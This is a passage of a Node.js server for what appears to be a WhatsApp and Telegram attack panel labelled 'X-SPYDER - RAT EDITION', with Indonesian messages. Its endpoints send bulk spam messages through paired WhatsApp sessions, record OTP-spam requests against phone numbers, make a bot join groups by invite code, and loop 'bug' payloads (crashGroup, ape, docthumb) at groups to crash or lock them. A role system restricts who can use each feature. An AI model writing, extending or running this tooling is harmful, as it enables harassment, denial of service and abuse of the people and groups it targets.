      return res.status(401).json({ valid: false, message: "User not found" });
    }
    
    if (!payload || payload.trim() === "") {
      return res.status(400).json({ valid: false, message: "Payload tidak boleh kosong" });
    }
    
    if (!target || target.trim() === "") {
      return res.status(400).json({ valid: false, message: "Target tidak boleh kosong" });
    }
    
    const history = readPayloadHistory();
    history.history.unshift({
      id: Date.now().toString(),
      username: user.username,
      payload: payload,
      target: target,
      delay: delay || 1000,
      loop: loop || 1,
      createdAt: new Date().toISOString()
    });
    
    if (history.history.length > 100) {
      history.history = history.history.slice(0, 100);
    }
    savePayloadHistory(history);
    
    saveUserLog(
      user.username,
      "custom_payload",
      "Custom Payload",
      `Target: ${target} | Delay: ${delay}ms | Loop: ${loop}`
    );
    
    res.json({
      valid: true,
      message: "Custom payload berhasil disimpan",
      data: {
        payload: payload,
        target: target,
        delay: delay || 1000,
        loop: loop || 1
      }
    });
    
  } catch (err) {
    console.error("[CUSTOM PAYLOAD] Error:", err);
    res.status(500).json({ valid: false, error: "Gagal menyimpan payload" });
  }
});

app.get("/api/custom-payload/history", (req, res) => {
  const { key } = req.query;
  
  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.status(401).json({ valid: false, message: "Invalid session key" });
  }
  
  const history = readPayloadHistory();
  const userHistory = history.history.filter(h => h.username === keyInfo.username);
  
  res.json({ valid: true, history: userHistory });
});

// ============================================================
// 🔥 SPAM WHATSAPP
// ============================================================

const SPAM_HISTORY_FILE = path.join(__dirname, 'spam_history.json');

if (!fs.existsSync(SPAM_HISTORY_FILE)) {
  fs.writeFileSync(SPAM_HISTORY_FILE, JSON.stringify({ history: [] }, null, 2));
}

function readSpamHistory() {
  try {
    const data = fs.readFileSync(SPAM_HISTORY_FILE, 'utf8');
    return JSON.parse(data);
  } catch {
    return { history: [] };
  }
}

function saveSpamHistory(data) {
  fs.writeFileSync(SPAM_HISTORY_FILE, JSON.stringify(data, null, 2));
}

app.post("/api/spam/whatsapp", (req, res) => {
  try {
    const key = req.body.key || req.query.key;
    const target = req.body.target || req.query.target;
    const message = req.body.message || req.query.message;
    const count = req.body.count || req.query.count;
    const delay = req.body.delay || req.query.delay;
    
    const keyInfo = activeKeys[key];
    if (!keyInfo) {
      return res.status(401).json({ valid: false, message: "Invalid session key" });
    }
    
    const db = loadDatabase();
    const user = db.find(u => u.username === keyInfo.username);
    if (!user) {
      return res.status(401).json({ valid: false, message: "User not found" });
    }
    
    if (!target || target.trim() === "") {
      return res.status(400).json({ valid: false, message: "Target tidak boleh kosong" });
    }
    
    if (!message || message.trim() === "") {
      return res.status(400).json({ valid: false, message: "Pesan tidak boleh kosong" });
    }
    
    const spamCount = parseInt(count) || 5;
    const spamDelay = parseInt(delay) || 1000;
    
    const history = readSpamHistory();
    history.history.unshift({
      id: Date.now().toString(),
      username: user.username,
      target: target,
      message: message.substring(0, 100),
      count: spamCount,
      delay: spamDelay,
      status: "pending",
      createdAt: new Date().toISOString()
    });
    
    if (history.history.length > 100) {
      history.history = history.history.slice(0, 100);
    }
    saveSpamHistory(history);
    
    saveUserLog(
      user.username,
      "spam_whatsapp",
      "Spam WhatsApp",
      `Target: ${target} | Count: ${spamCount}`
    );
    
    const entries = Object.entries(activeConnections);
    if (entries.length > 0) {
      const sock = entries[Math.floor(Math.random() * entries.length)][1];
      const targetJid = target.replace(/\D/g, "") + "@s.whatsapp.net";
      
      for (let i = 0; i < Math.min(spamCount, 10); i++) {
        setTimeout(async () => {
          try {
            await sock.sendMessage(targetJid, { text: message });
            console.log(`[SPAM] ${i+1}/${spamCount} sent to ${target}`);
          } catch (e) {
            console.log(`[SPAM] Error: ${e.message}`);
          }
        }, i * spamDelay);
      }
    }
    
    res.json({
      valid: true,
      message: "Spam WhatsApp berhasil dijadwalkan",
      data: {
        target: target,
        count: spamCount,
        delay: spamDelay,
        status: "pending"
      }
    });
    
  } catch (err) {
    console.error("[SPAM WHATSAPP] Error:", err);
    res.status(500).json({ valid: false, error: "Gagal menjalankan spam" });
  }
});

app.get("/api/spam/whatsapp", (req, res) => {
  const { key } = req.query;
  
  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.status(401).json({ valid: false, message: "Invalid session key" });
  }
  
  const history = readSpamHistory();
  const userHistory = history.history.filter(h => h.username === keyInfo.username);
  
  res.json({ valid: true, history: userHistory });
});

app.get("/api/spam/history", (req, res) => {
  const { key } = req.query;
  
  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.status(401).json({ valid: false, message: "Invalid session key" });
  }
  
  const history = readSpamHistory();
  const userHistory = history.history.filter(h => h.username === keyInfo.username);
  
  res.json({ valid: true, history: userHistory });
});

// ============================================================
// 🔥 TELEGRAM SPAM OTP
// ============================================================

app.post("/telegram/spam-otp", (req, res) => {
  try {
    const key = req.body.key || req.query.key;
    const phoneNumber = req.body.phoneNumber || req.query.phoneNumber;
    const count = req.body.count || req.query.count;
    
    const keyInfo = activeKeys[key];
    if (!keyInfo) {
      return res.status(401).json({ valid: false, message: "Invalid session key" });
    }
    
    if (!phoneNumber || phoneNumber.trim() === "") {
      return res.status(400).json({ valid: false, message: "Nomor telepon tidak boleh kosong" });
    }
    
    const spamCount = parseInt(count) || 3;
    
    saveUserLog(
      keyInfo.username,
      "spam_otp",
      "Spam OTP Telegram",
      `Target: ${phoneNumber} | Count: ${spamCount}`
    );
    
    res.json({
      valid: true,
      message: "Spam OTP Telegram berhasil dijalankan",
      data: {
        phoneNumber: phoneNumber,
        count: spamCount,
        status: "success"
      }
    });
    
  } catch (err) {
    console.error("[TELEGRAM SPAM OTP] Error:", err);
    res.status(500).json({ valid: false, error: "Gagal menjalankan spam OTP" });
  }
});

// ============================================================
// 🔥 HEALTH CHECK
// ============================================================

app.get("/health", (req, res) => {
  res.json({
    status: "ok",
    uptime: process.uptime(),
    timestamp: new Date().toISOString(),
    onlineUsers: onlineUsers.size,
    activeConnections: Object.keys(activeConnections).length,
    memory: process.memoryUsage(),
    version: "2.0.0"
  });
});

// ============================================================
// 🔥 SEND BUG GROUP
// ============================================================

app.get("/sendBugGroup", async (req, res) => {
  try {
    const { key, group, bugType } = req.query;
    
    const keyInfo = activeKeys[key];
    if (!keyInfo) {
      return res.status(401).json({ valid: false, message: "Invalid session key" });
    }
    
    const db = loadDatabase();
    const user = db.find(u => u.username === keyInfo.username);
    if (!user) {
      return res.status(401).json({ valid: false, message: "User not found" });
    }
    
    // Role yang bisa mengirim bug ke group
    const allowedRoles = ['developers', 'ceo', 'owner', 'admin', 'tangan_kanan', 'vip'];
    if (!allowedRoles.includes(user.role)) {
      return res.status(403).json({ 
        valid: false, 
        message: "Role Anda tidak memiliki izin untuk mengirim bug ke group." 
      });
    }
    
    if (!group || group.trim() === "") {
      return res.status(400).json({ valid: false, message: "Group ID tidak boleh kosong" });
    }
    
    if (!bugType || bugType.trim() === "") {
      return res.status(400).json({ valid: false, message: "Bug type tidak boleh kosong" });
    }
    
    const entries = Object.entries(activeConnections);
    if (entries.length === 0) {
      return res.status(503).json({ valid: false, message: "No sender connected. Silakan pairing WhatsApp terlebih dahulu." });
    }
    
    const sock = entries[Math.floor(Math.random() * entries.length)][1];
    const groupJid = group + "@g.us";
    
    switch (bugType) {
      case "android_group":
        for (let i = 0; i < 10; i++) {
          await crashGroup(sock, groupJid);
          await sleep(1000);
        }
        break;
      case "lock_group":
        for (let i = 0; i < 10; i++) {
          await ape(sock, groupJid);
          await sleep(1000);
        }
        break;
      case "roid_group":
        for (let i = 0; i < 10; i++) {
          await docthumb(sock, groupJid);
          await sleep(1000);
        }
        break;
      default:
        for (let i = 0; i < 10; i++) {
          await crashGroup(sock, groupJid);
          await sleep(1000);
        }
    }
    
    saveUserLog(
      user.username,
      "bug_group",
      "Kirim Bug ke Group",
      `Group: ${group} | Bug: ${bugType}`
    );
    
    res.json({
      valid: true,
      message: `Bug ${bugType} berhasil dikirim ke group ${group}`,
      data: {
        group: group,
        bugType: bugType,
        status: "success"
      }
    });
    
  } catch (err) {
    console.error("[SEND BUG GROUP] Error:", err);
    res.status(500).json({ valid: false, error: "Gagal mengirim bug ke group" });
  }
});

// ============================================================
// 🔥 MY GROUP
// ============================================================

app.get("/myGroup", async (req, res) => {
  try {
    const { key } = req.query;
    
    const keyInfo = activeKeys[key];
    if (!keyInfo) {
      return res.status(401).json({ valid: false, message: "Invalid session key" });
    }
    
    const db = loadDatabase();
    const user = db.find(u => u.username === keyInfo.username);
    if (!user) {
      return res.status(401).json({ valid: false, message: "User not found" });
    }
    
    const entries = Object.entries(activeConnections);
    if (entries.length === 0) {
      return res.status(503).json({ 
        valid: false, 
        message: "No sender connected. Silakan pairing WhatsApp terlebih dahulu.",
        groups: [],
        total: 0
      });
    }
    
    const sock = entries[Math.floor(Math.random() * entries.length)][1];
    
    try {
      const groups = await sock.groupFetchAllParticipating();
      const groupList = Object.keys(groups).map(jid => ({
        id: jid.replace('@g.us', ''),
        fullJid: jid,
        name: groups[jid].subject || "Unknown Group",
        participants: groups[jid].participants?.length || 0,
        owner: groups[jid].owner || "Unknown"
      }));
      
      res.json({
        valid: true,
        groups: groupList,
        total: groupList.length
      });
    } catch (err) {
      res.status(500).json({ 
        valid: false, 
        error: "Gagal mengambil daftar group: " + err.message 
      });
    }
    
  } catch (err) {
    console.error("[MY GROUP] Error:", err);
    res.status(500).json({ valid: false, error: "Gagal mengambil data group" });
  }
});

// ============================================================
// 🔥 JOIN GROUP
// ============================================================

app.post("/joinGroup", async (req, res) => {
  try {
    const key = req.body.key || req.query.key;
    const inviteCode = req.body.inviteCode || req.query.inviteCode || req.body.invite || req.query.invite;
    
    const keyInfo = activeKeys[key];
    if (!keyInfo) {
      return res.status(401).json({ valid: false, message: "Invalid session key" });
    }
    
    const db = loadDatabase();
    const user = db.find(u => u.username === keyInfo.username);
    if (!user) {
      return res.status(401).json({ valid: false, message: "User not found" });
    }
    
    // Role yang bisa join group via bot
    const allowedRoles = ['developers', 'ceo', 'owner', 'admin', 'tangan_kanan', 'vip'];
    if (!allowedRoles.includes(user.role)) {
      return res.status(403).json({ 
        valid: false, 
        message: "Role Anda tidak memiliki izin untuk join group." 
      });
    }
    
    if (!inviteCode || inviteCode.trim() === "") {
      return res.status(400).json({ valid: false, message: "Invite code tidak boleh kosong" });
    }
    
    const entries = Object.entries(activeConnections);
    if (entries.length === 0) {
      return res.status(503).json({ 
        valid: false, 
        message: "No sender connected. Silakan pairing WhatsApp terlebih dahulu." 
      });
    }
    
    const sock = entries[Math.floor(Math.random() * entries.length)][1];
    
    let cleanCode = inviteCode.trim();
    if (cleanCode.includes('chat.whatsapp.com/')) {
      cleanCode = cleanCode.split('chat.whatsapp.com/')[1].split('?')[0].trim();
    }
    if (cleanCode.includes('https://')) {
      cleanCode = cleanCode.split('/').pop().split('?')[0].trim();
    }
    
    try {
      const result = await sock.groupAcceptInvite(cleanCode);
      
      saveUserLog(
        user.username,
        "join_group",
        "Join Group",
        `Invite Code: ${cleanCode}`
      );
      
      res.json({
        valid: true,
        message: "Berhasil bergabung ke group",
        data: {
          inviteCode: cleanCode,
          status: "success",
          result: result
        }
      });
    } catch (err) {
      res.status(400).json({ 
        valid: false, 
        error: "Gagal bergabung ke group: " + err.message 
      });
    }
    
  } catch (err) {
    console.error("[JOIN GROUP] Error:", err);
    res.status(500).json({ valid: false, error: "Gagal bergabung ke group" });
  }
});

// ============================================================
// 🔥 BUG GROUP SYSTEMS
// ============================================================

const BUG_GROUP_SYSTEMS_FILE = path.join(__dirname, 'bugGroupSystems.json');

if (!fs.existsSync(BUG_GROUP_SYSTEMS_FILE)) {
  const defaultSystems = [
    { id: "coy", name: "🚀 X-SPYDER COY", description: "Bug untuk group", icon: "🐛", count: 0, delay: 0 },
    { id: "bug2", name: "🔥 BUG MANTAP", description: "Bug kedua", icon: "🔥", count: 0, delay: 0 },
    { id: "bug3", name: "💀 BUG MEMATIKAN", description: "Bug ketiga", icon: "💀", count: 0, delay: 0 }
  ];
  fs.writeFileSync(BUG_GROUP_SYSTEMS_FILE, JSON.stringify(defaultSystems, null, 2));
}

function loadBugSystems() {
  try {
    return JSON.parse(fs.readFileSync(BUG_GROUP_SYSTEMS_FILE, 'utf8'));
  } catch {
    return [];
  }
}

function saveBugSystems(data) {
  fs.writeFileSync(BUG_GROUP_SYSTEMS_FILE, JSON.stringify(data, null, 2));
}

app.get("/bugGroupSystems", (req, res) => {
  try {
    const systems = loadBugSystems();
    res.json({
      valid: true,
      bugSystems: systems
    });
  } catch (err) {
    console.error("[BUG GROUP SYSTEMS] Error:", err);
    res.status(500).json({ valid: false, error: "Gagal mengambil data bug systems" });
  }
});

// ============================================================
// 🔥 START SERVER
// ============================================================

console.log(`--------------------------------------------------`);
console.log(`    X-SPYDER - RAT EDITION   `);
console.log(`    STATUS : PERSISTENCE ACTIVE        `);
console.log(`    VERSION : 2.0.0 (NEW ROLE SYSTEM)  `);
console.log(`--------------------------------------------------`);

const wsPort = 11660;
server.listen(wsPort, () => {
  console.log(`Server running on http://pallmarketplace.rexypediaa.biz.id:${wsPort}`);
  startVipSessions();
  startUserSessions();
  console.log(`[AUTO REFRESH] Diatur setiap 30 menit sekali.`);
  setInterval(autoRefresh, THIRTY_MINUTES);
  console.log(`[AUTOCLEAN LOGS] Diatur setiap jam 12 malam WIB.`);
  scheduleAutoClean();
});
